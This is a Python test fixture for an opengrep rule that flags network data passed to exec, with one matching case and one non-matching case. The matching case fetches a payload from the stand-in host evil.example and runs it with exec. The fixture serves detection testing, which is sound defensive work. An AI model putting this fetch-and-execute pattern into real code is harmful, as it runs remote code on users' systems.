# opengrep --test fixtures for setup_net_to_exec.
# Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.
import requests


def bad():
    data = requests.get("http://evil.example/payload").text
    # ruleid: setup_net_to_exec
    exec(data)


def ok():
    # ok: setup_net_to_exec
    exec("print('static, not network-tainted')")
